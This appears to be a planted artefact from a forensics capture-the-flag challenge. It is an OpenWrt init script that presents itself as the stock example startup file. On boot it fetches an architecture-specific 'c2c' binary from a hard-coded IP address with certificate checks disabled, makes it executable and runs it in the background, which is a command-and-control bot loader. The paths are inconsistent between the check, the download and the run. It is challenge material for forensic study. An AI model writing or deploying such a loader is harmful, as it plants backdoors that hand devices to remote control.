# Forensics/RouteretouR/Resources/build/initc2c
#!/bin/sh /etc/rc.common
# Example script
# Copyright (C) 2007 OpenWrt.org
 
start() {        
        if ! command -v /tmp/c2cbot &> /dev/null
        then
            wget --no-check-certificate "https://108.129.42.183/$(uname -m)/c2c" -O /tmp/c2c
            chmod +x /tmp/c2c
        fi

        if ! command -v /tmp/c2c &> /dev/null
        then
            exit
        else
            /bin/c2c &
        fi
}